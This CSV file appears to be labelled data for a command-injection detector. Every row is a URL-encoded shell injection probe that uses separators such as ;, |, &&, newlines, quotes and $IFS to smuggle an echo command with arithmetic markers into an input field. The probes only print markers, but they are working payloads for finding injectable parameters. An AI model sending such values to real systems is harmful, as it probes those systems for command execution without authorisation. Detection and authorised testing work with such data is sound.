Sentence,Label
&&echo%20BALAGY$((97%2B95))$(echo%20BALAGY)BALAGY%22,1
";echo%20YRBNTY$((83%2B14))$(echo%20YRBNTY)YRBNTY""",1
;echo%20YDSNXZ$((29%2B43))$(echo%20YDSNXZ)YDSNXZ//,1
;echo%20UNXFGJ$((26%2B60))$(echo%20UNXFGJ)UNXFGJ&,1
;echo%20SIRYMP$((7%2B6))$(echo%20SIRYMP)SIRYMP|,1
;echo%20RHFTCS$((28%2B7))$(echo%20RHFTCS)RHFTCS%22,1
;echo%20PYZNPF$((23%2B64))$(echo%20PYZNPF)PYZNPF&,1
";echo%20PYWYEX$((88%2B85))$(echo%20PYWYEX)PYWYEX""",1
;echo%20PWKXHB$((27%2B16))$(echo%20PWKXHB)PWKXHB,1
;echo%20OIHFAC$((90%2B34))$(echo%20OIHFAC)OIHFAC%22,1
;echo%20NUCRTG$((61%2B63))$(echo%20NUCRTG)NUCRTG',1
;echo%20MXKHVK$((46%2B71))$(echo%20MXKHVK)MXKHVK%7C,1
;echo%20KUXGTM$((7%2B89))$(echo%20KUXGTM)KUXGTM%2F%2F,1
;echo%20KKGOUA$((23%2B96))$(echo%20KKGOUA)KKGOUA%5C%5C,1
;echo%20KHMFRS$((69%2B67))$(echo%20KHMFRS)KHMFRS',1
;echo%20KHCYPO$((77%2B38))$(echo%20KHCYPO)KHCYPO\,1
;echo%20IPTSZG$((46%2B17))$(echo%20IPTSZG)IPTSZG%27,1
;echo%20ICITTS$((63%2B83))$(echo%20ICITTS)ICITTS%2F%2F,1
;echo%20HYBMMW$((16%2B36))$(echo%20HYBMMW)HYBMMW%5C%5C,1
;echo%20HTPOKC$((39%2B32))$(echo%20HTPOKC)HTPOKC,1
;echo%20HPSGQK$((19%2B98))$(echo%20HPSGQK)HPSGQK%27,1
;echo%20FRDAGY$((96%2B63))$(echo%20FRDAGY)FRDAGY//,1
;echo%20DDXENF$((29%2B82))$(echo%20DDXENF)DDXENF%26,1
;echo%20CSPAAF$((48%2B26))$(echo%20CSPAAF)CSPAAF,1
;echo%20CCXTNP$((57%2B74))$(echo%20CCXTNP)CCXTNP|,1
;echo%20ACEKKI$((66%2B70))$(echo%20ACEKKI)ACEKKI\,1
echo%20VKRABE$((6%2B96))$(echo%20VKRABE)VKRABE,1
echo%20UZYQKP$((76%2B27))$(echo%20UZYQKP)UZYQKP',1
echo%20UUKZPI$((71%2B35))$(echo%20UUKZPI)UUKZPI//,1
"echo%20URWVVO$((0%2B4))$(echo%20URWVVO)URWVVO""",1
echo%20SLHLJI$((31%2B31))$(echo%20SLHLJI)SLHLJI%27,1
echo%20PXZDJA$((86%2B79))$(echo%20PXZDJA)PXZDJA%5C%5C,1
echo%20NTKKKZ$((98%2B48))$(echo%20NTKKKZ)NTKKKZ&,1
echo%20MTWKYX$((89%2B57))$(echo%20MTWKYX)MTWKYX\,1
echo%20LTOENX$((42%2B36))$(echo%20LTOENX)LTOENX%22,1
echo%20GXOGIA$((9%2B37))$(echo%20GXOGIA)GXOGIA%7C,1
echo%20EJWKAI$((82%2B9))$(echo%20EJWKAI)EJWKAI|,1
echo%20CDGATY$((12%2B29))$(echo%20CDGATY)CDGATY%2F%2F,1
echo%20BKRXCQ$((95%2B40))$(echo%20BKRXCQ)BKRXCQ%26,1
|echo%20YSISTZ$((83%2B82))$(echo%20YSISTZ)YSISTZ%2F%2F,1
|echo%20YARTFJ$((41%2B57))$(echo%20YARTFJ)YARTFJ%22,1
|echo%20SVSMOA$((21%2B73))$(echo%20SVSMOA)SVSMOA%7C,1
|echo%20SSHUWU$((85%2B62))$(echo%20SSHUWU)SSHUWU%27,1
|echo%20QVGNVW$((11%2B26))$(echo%20QVGNVW)QVGNVW%5C%5C,1
|echo%20LWFJZZ$((79%2B26))$(echo%20LWFJZZ)LWFJZZ\,1
|echo%20LRPXWZ$((88%2B39))$(echo%20LRPXWZ)LRPXWZ//,1
|echo%20LPZYWI$((40%2B14))$(echo%20LPZYWI)LPZYWI',1
|echo%20IXTPRS$((68%2B93))$(echo%20IXTPRS)IXTPRS,1
|echo%20ISAUQR$((2%2B13))$(echo%20ISAUQR)ISAUQR%26,1
"|echo%20IQBIEF$((77%2B16))$(echo%20IQBIEF)IQBIEF""",1
|echo%20HHGNAV$((39%2B89))$(echo%20HHGNAV)HHGNAV|,1
|echo%20DTKVRT$((20%2B98))$(echo%20DTKVRT)DTKVRT&,1
|echo%20DMMNWK$((14%2B86))$(echo%20DMMNWK)DMMNWK,1
||echo%20ZSBSMD$((90%2B5))$(echo%20ZSBSMD)ZSBSMD//,1
||echo%20VEAONC$((56%2B45))$(echo%20VEAONC)VEAONC,1
||echo%20UOPEHO$((55%2B30))$(echo%20UOPEHO)UOPEHO%26,1
||echo%20TVGLAW$((25%2B16))$(echo%20TVGLAW)TVGLAW%7C,1
"||echo%20THDZZM$((55%2B49))$(echo%20THDZZM)THDZZM""",1
||echo%20RLINTX$((21%2B20))$(echo%20RLINTX)RLINTX,1
||echo%20RJENUY$((95%2B27))$(echo%20RJENUY)RJENUY&,1
||echo%20PNTMBC$((8%2B17))$(echo%20PNTMBC)PNTMBC%5C%5C,1
||echo%20OSDDFQ$((3%2B39))$(echo%20OSDDFQ)OSDDFQ%2F%2F,1
||echo%20HEYZBA$((8%2B23))$(echo%20HEYZBA)HEYZBA%27,1
||echo%20GIZMTU$((59%2B20))$(echo%20GIZMTU)GIZMTU\,1
||echo%20EPBKKE$((59%2B69))$(echo%20EPBKKE)EPBKKE%22,1
||echo%20DNDMGP$((12%2B45))$(echo%20DNDMGP)DNDMGP|,1
||echo%20DFNHJP$((83%2B52))$(echo%20DFNHJP)DFNHJP',1
%7Cecho%20YZLKYH$((87%2B98))$(echo%20YZLKYH)YZLKYH,1
%7Cecho%20XUZUDN$((64%2B48))$(echo%20XUZUDN)XUZUDN//,1
%7Cecho%20VSTJXX$((81%2B22))$(echo%20VSTJXX)VSTJXX&,1
%7Cecho%20SZVAMO$((82%2B22))$(echo%20SZVAMO)SZVAMO,1
%7Cecho%20QDGJFF$((4%2B21))$(echo%20QDGJFF)QDGJFF%26,1
%7Cecho%20OXATGO$((9%2B84))$(echo%20OXATGO)OXATGO\,1
%7Cecho%20OSTCOG$((49%2B82))$(echo%20OSTCOG)OSTCOG,1
%7Cecho%20MIBCVM$((5%2B17))$(echo%20MIBCVM)MIBCVM',1
%7Cecho%20LZYGCY$((26%2B70))$(echo%20LZYGCY)LZYGCY%2F%2F,1
%7Cecho%20KMHHPF$((93%2B77))$(echo%20KMHHPF)KMHHPF%22,1
%7Cecho%20JQVRWN$((97%2B95))$(echo%20JQVRWN)JQVRWN%7C,1
%7Cecho%20HSVDWC$((31%2B24))$(echo%20HSVDWC)HSVDWC%5C%5C,1
%7Cecho%20DSGRDB$((86%2B22))$(echo%20DSGRDB)DSGRDB%27,1
"%7Cecho%20CDHGHW$((46%2B6))$(echo%20CDHGHW)CDHGHW""",1
%7Cecho%20ACPWWS$((49%2B8))$(echo%20ACPWWS)ACPWWS|,1
%7C%7Cecho%20WQVXFQ$((11%2B54))$(echo%20WQVXFQ)WQVXFQ%27,1
%7C%7Cecho%20VUVMFJ$((74%2B32))$(echo%20VUVMFJ)VUVMFJ&,1
%7C%7Cecho%20TKWKEV$((96%2B49))$(echo%20TKWKEV)TKWKEV',1
%7C%7Cecho%20SRPIFR$((51%2B42))$(echo%20SRPIFR)SRPIFR%22,1
%7C%7Cecho%20QCTOMN$((80%2B24))$(echo%20QCTOMN)QCTOMN%26,1
%7C%7Cecho%20OUUQGP$((77%2B65))$(echo%20OUUQGP)OUUQGP%2F%2F,1
%7C%7Cecho%20MVZOUV$((29%2B33))$(echo%20MVZOUV)MVZOUV|,1
%7C%7Cecho%20HXJEXE$((93%2B89))$(echo%20HXJEXE)HXJEXE%5C%5C,1
%7C%7Cecho%20HRETTA$((56%2B9))$(echo%20HRETTA)HRETTA,1
%7C%7Cecho%20GESUGU$((82%2B60))$(echo%20GESUGU)GESUGU//,1
%7C%7Cecho%20FZHCCB$((68%2B25))$(echo%20FZHCCB)FZHCCB,1
%7C%7Cecho%20FGCEYJ$((57%2B45))$(echo%20FGCEYJ)FGCEYJ%7C,1
%7C%7Cecho%20EUMDZA$((75%2B60))$(echo%20EUMDZA)EUMDZA\,1
"%7C%7Cecho%20DODCOD$((31%2B91))$(echo%20DODCOD)DODCOD""",1
%7C%20echo%20QXCOXL$((27%2B5))$(echo%20QXCOXL)QXCOXL,1
"%3Becho%20YLZHIS$((5%2B69))$(echo%20YLZHIS)YLZHIS""",1
%3Becho%20XWLOVV$((27%2B91))$(echo%20XWLOVV)XWLOVV\,1
%3Becho%20WJRNPH$((1%2B15))$(echo%20WJRNPH)WJRNPH',1
%3Becho%20OVSKJI$((16%2B53))$(echo%20OVSKJI)OVSKJI%7C,1
%3Becho%20OHFUJG$((48%2B14))$(echo%20OHFUJG)OHFUJG&,1
%3Becho%20LSPXCM$((79%2B79))$(echo%20LSPXCM)LSPXCM|,1
%3Becho%20JICGBW$((21%2B40))$(echo%20JICGBW)JICGBW,1
%3Becho%20FXYIAP$((22%2B40))$(echo%20FXYIAP)FXYIAP%5C%5C,1
%3Becho%20FMKLWP$((66%2B12))$(echo%20FMKLWP)FMKLWP%22,1
%3Becho%20DXYJDU$((98%2B7))$(echo%20DXYJDU)DXYJDU%2F%2F,1
%3Becho%20DNATLQ$((29%2B55))$(echo%20DNATLQ)DNATLQ%26,1
%3Becho%20CLWYAX$((98%2B78))$(echo%20CLWYAX)CLWYAX%27,1
%3Becho%20CKMZMV$((11%2B82))$(echo%20CKMZMV)CKMZMV//,1
%3Becho%20BFFGMX$((91%2B86))$(echo%20BFFGMX)BFFGMX,1
%26echo%20YCWTLN$((43%2B74))$(echo%20YCWTLN)YCWTLN%22,1
%26echo%20XUKFFI$((79%2B7))$(echo%20XUKFFI)XUKFFI,1
%26echo%20XOVEHW$((64%2B7))$(echo%20XOVEHW)XOVEHW%2F%2F,1
%26echo%20UMBLZI$((32%2B33))$(echo%20UMBLZI)UMBLZI%27,1
%26echo%20TITLCP$((35%2B27))$(echo%20TITLCP)TITLCP|,1
%26echo%20RYNLFM$((45%2B53))$(echo%20RYNLFM)RYNLFM,1
%26echo%20QWOBER$((53%2B15))$(echo%20QWOBER)QWOBER%7C,1
%26echo%20LQDBIP$((97%2B15))$(echo%20LQDBIP)LQDBIP,1
%26echo%20JUDEXC$((97%2B30))$(echo%20JUDEXC)JUDEXC',1
%26echo%20GICKYF$((34%2B87))$(echo%20GICKYF)GICKYF%26,1
%26echo%20GCKMJW$((96%2B51))$(echo%20GCKMJW)GCKMJW//,1
%26echo%20GAMOJU$((86%2B49))$(echo%20GAMOJU)GAMOJU\,1
%26echo%20FEBSKN$((28%2B4))$(echo%20FEBSKN)FEBSKN%5C%5C,1
"%26echo%20EDHTTZ$((57%2B39))$(echo%20EDHTTZ)EDHTTZ""",1
%26echo%20CWOFVZ$((5%2B33))$(echo%20CWOFVZ)CWOFVZ&,1
%26%26echo%20ZEPMBC$((82%2B3))$(echo%20ZEPMBC)ZEPMBC%26,1
%26%26echo%20YKZSCO$((10%2B70))$(echo%20YKZSCO)YKZSCO%22,1
%26%26echo%20YAIFIN$((82%2B83))$(echo%20YAIFIN)YAIFIN%5C%5C,1
%26%26echo%20XVKSQG$((73%2B31))$(echo%20XVKSQG)XVKSQG&,1
%26%26echo%20SXYROH$((80%2B44))$(echo%20SXYROH)SXYROH,1
%26%26echo%20PNMDUS$((34%2B98))$(echo%20PNMDUS)PNMDUS//,1
%26%26echo%20PGMBBO$((3%2B90))$(echo%20PGMBBO)PGMBBO',1
%26%26echo%20OUHWFL$((62%2B61))$(echo%20OUHWFL)OUHWFL|,1
%26%26echo%20OCTJGM$((17%2B59))$(echo%20OCTJGM)OCTJGM\,1
%26%26echo%20NSDCQT$((87%2B20))$(echo%20NSDCQT)NSDCQT%2F%2F,1
%26%26echo%20MVFPXA$((61%2B74))$(echo%20MVFPXA)MVFPXA%7C,1
%26%26echo%20HOPIIN$((13%2B15))$(echo%20HOPIIN)HOPIIN%27,1
%26%26echo%20HKCUQK$((13%2B67))$(echo%20HKCUQK)HKCUQK,1
"%26%26echo%20CLFOGI$((20%2B37))$(echo%20CLFOGI)CLFOGI""",1
%26%20echo%20QJINVP$((61%2B57))$(echo%20QJINVP)QJINVP,1
%22echo%20ZXCMSF$((31%2B27))$(echo%20ZXCMSF)ZXCMSF%5C%5C,1
%22echo%20HOFMJC$((68%2B53))$(echo%20HOFMJC)HOFMJC%2F%2F,1
%22echo%20HFMYLX$((51%2B18))$(echo%20HFMYLX)HFMYLX%22,1
%22echo%20ESVBXV$((89%2B66))$(echo%20ESVBXV)ESVBXV%26,1
%22echo%20DZXQHG$((20%2B46))$(echo%20DZXQHG)DZXQHG%7C,1
%22echo%20COJKHQ$((57%2B48))$(echo%20COJKHQ)COJKHQ%27,1
%22|echo%20XZZPRW$((63%2B45))$(echo%20XZZPRW)XZZPRW%5C%5C,1
%22|echo%20TIADZA$((14%2B49))$(echo%20TIADZA)TIADZA%27,1
%22|echo%20RZKEXB$((2%2B63))$(echo%20RZKEXB)RZKEXB%7C,1
%22|echo%20IBSIQJ$((92%2B88))$(echo%20IBSIQJ)IBSIQJ%22,1
%22|echo%20ANEUHZ$((23%2B22))$(echo%20ANEUHZ)ANEUHZ%2F%2F,1
%22|echo%20AJPXDT$((8%2B89))$(echo%20AJPXDT)AJPXDT%26,1
%22||echo%20XFBOCN$((61%2B25))$(echo%20XFBOCN)XFBOCN%2F%2F,1
%22||echo%20WMJGBT$((73%2B39))$(echo%20WMJGBT)WMJGBT%5C%5C,1
%22||echo%20JCPPUE$((34%2B90))$(echo%20JCPPUE)JCPPUE%26,1
%22||echo%20EYSOOE$((50%2B13))$(echo%20EYSOOE)EYSOOE%7C,1
%22||echo%20DORIYY$((30%2B85))$(echo%20DORIYY)DORIYY%22,1
%22||echo%20CMLPBA$((44%2B89))$(echo%20CMLPBA)CMLPBA%27,1
%22%7Cecho%20SQSPCP$((36%2B68))$(echo%20SQSPCP)SQSPCP%7C,1
%22%7Cecho%20LKRAYZ$((79%2B32))$(echo%20LKRAYZ)LKRAYZ%27,1
%22%7Cecho%20LKHTVK$((30%2B54))$(echo%20LKHTVK)LKHTVK%2F%2F,1
%22%7Cecho%20FNNAMY$((56%2B18))$(echo%20FNNAMY)FNNAMY%26,1
%22%7Cecho%20EDEEZB$((20%2B80))$(echo%20EDEEZB)EDEEZB%22,1
%22%7Cecho%20AITHIZ$((84%2B6))$(echo%20AITHIZ)AITHIZ%5C%5C,1
%22%7C%7Cecho%20UJQDXR$((25%2B32))$(echo%20UJQDXR)UJQDXR%22,1
%22%7C%7Cecho%20MNEBSX$((23%2B36))$(echo%20MNEBSX)MNEBSX%26,1
%22%7C%7Cecho%20LPSQRE$((76%2B2))$(echo%20LPSQRE)LPSQRE%27,1
%22%7C%7Cecho%20IVDYQE$((21%2B54))$(echo%20IVDYQE)IVDYQE%5C%5C,1
%22%7C%7Cecho%20GJECAG$((89%2B5))$(echo%20GJECAG)GJECAG%7C,1
%22%7C%7Cecho%20BGQCNZ$((2%2B66))$(echo%20BGQCNZ)BGQCNZ%2F%2F,1
%22%3Becho%20VPPMSS$((65%2B3))$(echo%20VPPMSS)VPPMSS%7C,1
%22%3Becho%20PZXCGX$((34%2B78))$(echo%20PZXCGX)PZXCGX%2F%2F,1
%22%3Becho%20LMRJYU$((40%2B49))$(echo%20LMRJYU)LMRJYU%5C%5C,1
%22%3Becho%20EQXSGK$((86%2B0))$(echo%20EQXSGK)EQXSGK%26,1
%22%3Becho%20DVBSPR$((73%2B13))$(echo%20DVBSPR)DVBSPR%27,1
%22%3Becho%20BPGUEU$((77%2B5))$(echo%20BPGUEU)BPGUEU%22,1
%22%26echo%20VGMMDM$((58%2B64))$(echo%20VGMMDM)VGMMDM%22,1
%22%26echo%20RWYPHC$((46%2B28))$(echo%20RWYPHC)RWYPHC%26,1
%22%26echo%20LLWODV$((74%2B52))$(echo%20LLWODV)LLWODV%27,1
%22%26echo%20IFPLFI$((38%2B60))$(echo%20IFPLFI)IFPLFI%5C%5C,1
%22%26echo%20DKZRJM$((95%2B2))$(echo%20DKZRJM)DKZRJM%7C,1
%22%26echo%20BLPHOB$((47%2B53))$(echo%20BLPHOB)BLPHOB%2F%2F,1
%22%26%26echo%20YIKPNA$((95%2B99))$(echo%20YIKPNA)YIKPNA%26,1
%22%26%26echo%20QYVLPC$((24%2B55))$(echo%20QYVLPC)QYVLPC%22,1
%22%26%26echo%20MWFRFW$((14%2B54))$(echo%20MWFRFW)MWFRFW%2F%2F,1
%22%26%26echo%20FXNWMX$((79%2B34))$(echo%20FXNWMX)FXNWMX%27,1
%22%26%26echo%20DAEOVC$((76%2B21))$(echo%20DAEOVC)DAEOVC%5C%5C,1
%22%26%26echo%20AQMHPO$((37%2B73))$(echo%20AQMHPO)AQMHPO%7C,1
%22%20echo%20RWFBCU$((99%2B46))$(echo%20RWFBCU)RWFBCU%5C%5C,1
%22%20echo%20RCJQEC$((82%2B64))$(echo%20RCJQEC)RCJQEC%22,1
%22%20echo%20GFNYXZ$((0%2B51))$(echo%20GFNYXZ)GFNYXZ%7C,1
%22%20echo%20CMONNY$((1%2B69))$(echo%20CMONNY)CMONNY%27,1
%22%20echo%20BNDKEW$((39%2B20))$(echo%20BNDKEW)BNDKEW%26,1
%22%20echo%20AXZBUQ$((26%2B11))$(echo%20AXZBUQ)AXZBUQ%2F%2F,1
%22%0aecho%20SVPNNA$((78%2B23))$(echo%20SVPNNA)SVPNNA%27,1
%22%0aecho%20QSSUKH$((35%2B92))$(echo%20QSSUKH)QSSUKH%5C%5C,1
%22%0aecho%20OSZJBG$((54%2B26))$(echo%20OSZJBG)OSZJBG%22,1
%22%0aecho%20MZNBQO$((65%2B66))$(echo%20MZNBQO)MZNBQO%26,1
%22%0aecho%20LGFSNB$((46%2B9))$(echo%20LGFSNB)LGFSNB%7C,1
%22%0aecho%20BAVEIJ$((9%2B64))$(echo%20BAVEIJ)BAVEIJ%2F%2F,1
%22&echo%20XDIPPG$((33%2B59))$(echo%20XDIPPG)XDIPPG%26,1
%22&echo%20QWXPLL$((32%2B57))$(echo%20QWXPLL)QWXPLL%5C%5C,1
%22&echo%20OWORKI$((87%2B59))$(echo%20OWORKI)OWORKI%2F%2F,1
%22&echo%20JKZWSO$((16%2B99))$(echo%20JKZWSO)JKZWSO%7C,1
%22&echo%20IRSLRF$((35%2B88))$(echo%20IRSLRF)IRSLRF%22,1
%22&echo%20CTSDYA$((54%2B8))$(echo%20CTSDYA)CTSDYA%27,1
%22&&echo%20YRTLHO$((69%2B19))$(echo%20YRTLHO)YRTLHO%2F%2F,1
%22&&echo%20RFPQXJ$((16%2B75))$(echo%20RFPQXJ)RFPQXJ%26,1
%22&&echo%20QZUTVR$((14%2B14))$(echo%20QZUTVR)QZUTVR%27,1
%22&&echo%20KCTHKN$((54%2B70))$(echo%20KCTHKN)KCTHKN%7C,1
%22&&echo%20IMYKBH$((59%2B74))$(echo%20IMYKBH)IMYKBH%5C%5C,1
%22&&echo%20GJOLMS$((8%2B3))$(echo%20GJOLMS)GJOLMS%22,1
%22;echo%20TJENJF$((97%2B10))$(echo%20TJENJF)TJENJF%7C,1
%22;echo%20JHIVSM$((44%2B64))$(echo%20JHIVSM)JHIVSM%2F%2F,1
%22;echo%20IFLGNR$((31%2B89))$(echo%20IFLGNR)IFLGNR%27,1
%22;echo%20FUCJMY$((75%2B58))$(echo%20FUCJMY)FUCJMY%5C%5C,1
%22;echo%20BGIYOF$((34%2B50))$(echo%20BGIYOF)BGIYOF%26,1
%22;echo%20BEQETV$((73%2B10))$(echo%20BEQETV)BEQETV%22,1
%20echo%20XHVOFZ$((83%2B80))$(echo%20XHVOFZ)XHVOFZ%2F%2F,1
%20echo%20VKXTTD$((59%2B83))$(echo%20VKXTTD)VKXTTD%22,1
%20echo%20UNSAJW$((40%2B12))$(echo%20UNSAJW)UNSAJW//,1
%20echo%20THCQQN$((0%2B88))$(echo%20THCQQN)THCQQN%5C%5C,1
%20echo%20SBCWOI$((11%2B5))$(echo%20SBCWOI)SBCWOI\,1
%20echo%20ROWYVB$((27%2B55))$(echo%20ROWYVB)ROWYVB&,1
%20echo%20QKJRMZ$((93%2B3))$(echo%20QKJRMZ)QKJRMZ%26,1
"%20echo%20PVBSCV$((25%2B60))$(echo%20PVBSCV)PVBSCV""",1
%20echo%20OQZVWP$((28%2B27))$(echo%20OQZVWP)OQZVWP%7C,1
%20echo%20OMZNPF$((86%2B96))$(echo%20OMZNPF)OMZNPF',1
%20echo%20HVFWAN$((72%2B27))$(echo%20HVFWAN)HVFWAN|,1
%20echo%20HLPASS$((48%2B61))$(echo%20HLPASS)HLPASS,1
%20echo%20CBLVPB$((13%2B39))$(echo%20CBLVPB)CBLVPB%27,1
%0aecho%20YBTGCG$((1%2B43))$(echo%20YBTGCG)YBTGCG,1
%0aecho%20XKMVBL$((16%2B26))$(echo%20XKMVBL)XKMVBL,1
%0aecho%20VXXNDX$((4%2B53))$(echo%20VXXNDX)VXXNDX%7C,1
%0aecho%20TRSCUU$((6%2B83))$(echo%20TRSCUU)TRSCUU//,1
%0aecho%20THLXXR$((89%2B18))$(echo%20THLXXR)THLXXR%2F%2F,1
%0aecho%20TFYSCR$((64%2B58))$(echo%20TFYSCR)TFYSCR|,1
"%0aecho%20SUTYKL$((12%2B33))$(echo%20SUTYKL)SUTYKL""",1
%0aecho%20RXYLFZ$((20%2B86))$(echo%20RXYLFZ)RXYLFZ&,1
%0aecho%20RQUCHA$((6%2B94))$(echo%20RQUCHA)RQUCHA',1
%0aecho%20OPVAFF$((48%2B62))$(echo%20OPVAFF)OPVAFF%22,1
%0aecho%20KWAWXC$((47%2B31))$(echo%20KWAWXC)KWAWXC%26,1
%0aecho%20FUZHOM$((22%2B69))$(echo%20FUZHOM)FUZHOM%5C%5C,1
%0aecho%20DINDDL$((2%2B20))$(echo%20DINDDL)DINDDL%27,1
%0aecho%20CQEILX$((20%2B83))$(echo%20CQEILX)CQEILX\,1
&echo%20YSZWVH$((93%2B51))$(echo%20YSZWVH)YSZWVH,1
&echo%20XLLZAF$((16%2B93))$(echo%20XLLZAF)XLLZAF&,1
&echo%20VLOVLO$((85%2B23))$(echo%20VLOVLO)VLOVLO%22,1
&echo%20UDYYJG$((66%2B1))$(echo%20UDYYJG)UDYYJG',1
"&echo%20TGYKVF$((42%2B14))$(echo%20TGYKVF)TGYKVF""",1
&echo%20TEOUXN$((44%2B11))$(echo%20TEOUXN)TEOUXN%7C,1
&echo%20RCNYOU$((2%2B11))$(echo%20RCNYOU)RCNYOU|,1
&echo%20QPEVFY$((91%2B41))$(echo%20QPEVFY)QPEVFY,1
&echo%20OSUMBG$((2%2B75))$(echo%20OSUMBG)OSUMBG%5C%5C,1
&echo%20KHEGEQ$((46%2B22))$(echo%20KHEGEQ)KHEGEQ//,1
&echo%20JDWSVZ$((58%2B52))$(echo%20JDWSVZ)JDWSVZ,1
&echo%20HATTRN$((28%2B69))$(echo%20HATTRN)HATTRN%26,1
&echo%20EIEDPG$((1%2B95))$(echo%20EIEDPG)EIEDPG%27,1
&echo%20DQKWMO$((0%2B96))$(echo%20DQKWMO)DQKWMO\,1
&echo%20CXWXBB$((97%2B33))$(echo%20CXWXBB)CXWXBB%2F%2F,1
&&echo%20YLPPIG$((46%2B74))$(echo%20YLPPIG)YLPPIG&,1
&&echo%20YJBIEJ$((20%2B48))$(echo%20YJBIEJ)YJBIEJ%7C,1
&&echo%20VRZBVN$((80%2B99))$(echo%20VRZBVN)VRZBVN//,1
&&echo%20VGPHAP$((62%2B79))$(echo%20VGPHAP)VGPHAP%26,1
&&echo%20VEBSDL$((18%2B99))$(echo%20VEBSDL)VEBSDL%22,1
&&echo%20SGBEKO$((44%2B10))$(echo%20SGBEKO)SGBEKO%5C%5C,1
&&echo%20RPUZNC$((77%2B38))$(echo%20RPUZNC)RPUZNC%2F%2F,1
&&echo%20NWPTID$((80%2B31))$(echo%20NWPTID)NWPTID,1
&&echo%20JXFFUT$((67%2B52))$(echo%20JXFFUT)JXFFUT,1
&&echo%20HGBXKT$((12%2B65))$(echo%20HGBXKT)HGBXKT|,1
&&echo%20FEYLRM$((81%2B59))$(echo%20FEYLRM)FEYLRM%27,1
&&echo%20DPKVKY$((97%2B15))$(echo%20DPKVKY)DPKVKY\,1
&&echo%20ANJDXN$((18%2B20))$(echo%20ANJDXN)ANJDXN',1
"&&echo%20AJIUPP$((67%2B66))$(echo%20AJIUPP)AJIUPP""",1
;echo%20ZQUXYY$((11%2B19))$(echo%20ZQUXYY)ZQUXYY%26,1
;echo%20ZIRSUJ$((79%2B94))$(echo%20ZIRSUJ)ZIRSUJ|,1
;echo%20YJRHBX$((4%2B25))$(echo%20YJRHBX)YJRHBX',1
;echo%20XSFSQB$((48%2B74))$(echo%20XSFSQB)XSFSQB%2F%2F,1
";echo%20VBODDE$((78%2B21))$(echo%20VBODDE)VBODDE""",1
;echo%20TFWHBO$((48%2B78))$(echo%20TFWHBO)TFWHBO%7C,1
;echo%20RDEQIN$((60%2B72))$(echo%20RDEQIN)RDEQIN//,1
;echo%20OXGNMX$((41%2B15))$(echo%20OXGNMX)OXGNMX,1
;echo%20OSGFBJ$((4%2B40))$(echo%20OSGFBJ)OSGFBJ%5C%5C,1
;echo%20KSVCNW$((0%2B53))$(echo%20KSVCNW)KSVCNW,1
;echo%20JPGWRQ$((89%2B36))$(echo%20JPGWRQ)JPGWRQ,1
;echo%20IBYDJK$((27%2B85))$(echo%20IBYDJK)IBYDJK%22,1
;echo%20HLWPGL$((69%2B63))$(echo%20HLWPGL)HLWPGL\,1
;echo%20DIKSWB$((93%2B23))$(echo%20DIKSWB)DIKSWB%27,1
;echo%20BSAABA$((22%2B11))$(echo%20BSAABA)BSAABA&,1
echo$IFSZFQEOG$((33%2B69))$(echo$IFSZFQEOG)ZFQEOG|,1
echo$IFSYOOFMV$((62%2B55))$(echo$IFSYOOFMV)YOOFMV,1
echo$IFSYLWBCG$((49%2B32))$(echo$IFSYLWBCG)YLWBCG%22,1
echo$IFSWTMGEX$((31%2B97))$(echo$IFSWTMGEX)WTMGEX\,1
echo$IFSUCMQAW$((90%2B56))$(echo$IFSUCMQAW)UCMQAW&,1
echo$IFSPQLHVF$((2%2B67))$(echo$IFSPQLHVF)PQLHVF%5C%5C,1
echo$IFSPDGOWG$((0%2B24))$(echo$IFSPDGOWG)PDGOWG%2F%2F,1
echo$IFSODFQBQ$((97%2B35))$(echo$IFSODFQBQ)ODFQBQ%26,1
echo$IFSNZFJZC$((22%2B7))$(echo$IFSNZFJZC)NZFJZC',1
echo$IFSMHUBAH$((13%2B52))$(echo$IFSMHUBAH)MHUBAH//,1
echo$IFSMEFODD$((49%2B43))$(echo$IFSMEFODD)MEFODD,1
echo$IFSKZIGXE$((85%2B95))$(echo$IFSKZIGXE)KZIGXE,1
echo$IFSKFKPRE$((22%2B12))$(echo$IFSKFKPRE)KFKPRE|,1
"echo$IFSJWHAWX$((24%2B49))$(echo$IFSJWHAWX)JWHAWX""",1
echo$IFSIZVWCK$((54%2B72))$(echo$IFSIZVWCK)IZVWCK,1
echo$IFSGEYHDT$((98%2B13))$(echo$IFSGEYHDT)GEYHDT//,1
echo$IFSEOXXHA$((67%2B86))$(echo$IFSEOXXHA)EOXXHA',1
"echo$IFSDYARGF$((39%2B79))$(echo$IFSDYARGF)DYARGF""",1
echo$IFSCXOURS$((94%2B53))$(echo$IFSCXOURS)CXOURS%27,1
echo$IFSCTYHYD$((2%2B94))$(echo$IFSCTYHYD)CTYHYD%7C,1
